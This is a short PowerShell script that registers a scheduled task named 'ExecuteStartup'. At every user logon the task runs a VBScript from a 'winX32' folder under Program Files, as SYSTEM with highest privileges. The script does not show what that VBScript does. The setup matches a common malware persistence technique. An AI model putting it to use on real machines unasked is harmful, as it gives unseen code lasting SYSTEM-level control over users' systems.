# Define the name for the scheduled task
$taskName = "ExecuteStartup"

# Path to the VBScript
$scriptPath = "C:\Program Files (x86)\winX32\execute.vbs"

# Check if the task already exists and unregister it if it does
Unregister-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

# Create a new scheduled task
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet -DontStopOnIdleEnd
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force

# Start the scheduled task
Start-ScheduledTask -TaskName $taskName

Write-Output "Scheduled task created to execute the VBScript at logon of any user with highest privileges."

# Pause execution
Write-Host "Press any key to close this window . . ."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
